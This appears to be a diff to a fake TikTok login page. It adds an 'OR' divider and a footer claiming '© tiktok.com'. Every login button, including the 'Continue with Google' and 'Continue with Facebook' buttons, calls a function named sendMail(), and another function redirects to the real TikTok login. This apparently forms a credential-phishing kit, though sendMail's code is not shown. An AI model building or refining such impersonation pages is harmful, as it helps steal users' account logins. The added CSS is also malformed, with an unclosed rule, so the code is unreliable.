@@ -164,7 +164,17 @@ body {
   justify-content: center; /* Centers horizontally */
   align-items: center;  
 }
-  }
+ .or {
+    text-align: center;
+    margin: 22px 0;
+    color: #aaa;
+    font-size: 14px;
+}
+.footer {
+    text-align: center;
+    font-size: 13px;
+    color: #888;
+    margin-top: 25px;
 </style>
 </head>
 
@@ -186,7 +196,7 @@ body {
   </div>
 
   <div class="btn" onclick="sendMail()">Log in</div>
-
+<div class="or">OR</div>
   <div class="btnn" alt onclick="sendMail()">Continue with Google</div>
   <div class="btnn" alt onclick="sendMail()">Continue with Facebook</div>
 </div>
@@ -256,6 +266,9 @@ function goTikTok() {
   window.location.href = "https://www.tiktok.com/login/?enter_method=enter_personal_homepage&enter_from=personal_homepage&launch_type=0&lang=en&redirect_url=https%3A%2F%2Fwww.tiktok.com%2Fprofile";
 }
 </script>
+ <div class="footer">
+        ©️ tiktok.com
+    </div>
 <div id="loading" class="loader-screen" style="display:none;">
   <div class="loader">
     <div class="dot red"></div>
